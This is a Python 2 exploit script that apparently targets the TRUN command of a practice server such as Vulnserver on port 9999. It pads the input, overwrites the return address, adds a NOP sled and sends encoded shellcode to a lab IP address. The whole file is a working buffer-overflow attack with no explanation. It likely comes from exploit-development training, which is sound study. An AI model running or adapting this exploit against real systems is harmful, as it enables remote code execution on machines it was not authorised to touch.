#!/usr/bin/python
import sys, socket

overflow = (
"\xb8\x7b\x1c\xc0\xb3\xda\xc6\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\xb8\x18\x22\x46\xc2\xc9\x20"
"\xa9\x3a\x0a\x45\x23\xdf\x3b\x45\x57\x94\x6c\x75\x13\xf8\x80"
"\xfe\x71\xe8\x13\x72\x5e\x1f\x93\x39\xb8\x2e\x24\x11\xf8\x31"
"\xa6\x68\x2d\x91\x97\xa2\x20\xd0\xd0\xdf\xc9\x80\x89\x94\x7c"
"\x34\xbd\xe1\xbc\xbf\x8d\xe4\xc4\x5c\x45\x06\xe4\xf3\xdd\x51"
"\x26\xf2\x32\xea\x6f\xec\x57\xd7\x26\x87\xac\xa3\xb8\x41\xfd"
"\x4c\x16\xac\x31\xbf\x66\xe9\xf6\x20\x1d\x03\x05\xdc\x26\xd0"
"\x77\x3a\xa2\xc2\xd0\xc9\x14\x2e\xe0\x1e\xc2\xa5\xee\xeb\x80"
"\xe1\xf2\xea\x45\x9a\x0f\x66\x68\x4c\x86\x3c\x4f\x48\xc2\xe7"
"\xee\xc9\xae\x46\x0e\x09\x11\x36\xaa\x42\xbc\x23\xc7\x09\xa9"
"\x80\xea\xb1\x29\x8f\x7d\xc2\x1b\x10\xd6\x4c\x10\xd9\xf0\x8b"
"\x57\xf0\x45\x03\xa6\xfb\xb5\x0a\x6d\xaf\xe5\x24\x44\xd0\x6d"
"\xb4\x69\x05\x21\xe4\xc5\xf6\x82\x54\xa6\xa6\x6a\xbe\x29\x98"
"\x8b\xc1\xe3\xb1\x26\x38\x64\x12\xa6\xb6\xf4\x02\xc5\x36\xe3"
"\xca\x40\xd0\x61\xfb\x04\x4b\x1e\x62\x0d\x07\xbf\x6b\x9b\x62"
"\xff\xe0\x28\x93\x4e\x01\x44\x87\x27\xe1\x13\xf5\xee\xfe\x89"
"\x91\x6d\x6c\x56\x61\xfb\x8d\xc1\x36\xac\x60\x18\xd2\x40\xda"
"\xb2\xc0\x98\xba\xfd\x40\x47\x7f\x03\x49\x0a\x3b\x27\x59\xd2"
"\xc4\x63\x0d\x8a\x92\x3d\xfb\x6c\x4d\x8c\x55\x27\x22\x46\x31"
"\xbe\x08\x59\x47\xbf\x44\x2f\xa7\x0e\x31\x76\xd8\xbf\xd5\x7e"
"\xa1\xdd\x45\x80\x78\x66\x65\x63\xa8\x93\x0e\x3a\x39\x1e\x53"
"\xbd\x94\x5d\x6a\x3e\x1c\x1e\x89\x5e\x55\x1b\xd5\xd8\x86\x51"
"\x46\x8d\xa8\xc6\x67\x84")

shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('172.16.244.131',9999))

        s.send(('TRUN /.:/' + shellcode))
        s.close

except:
        print "Error connecting to the server"
        sys.exit()
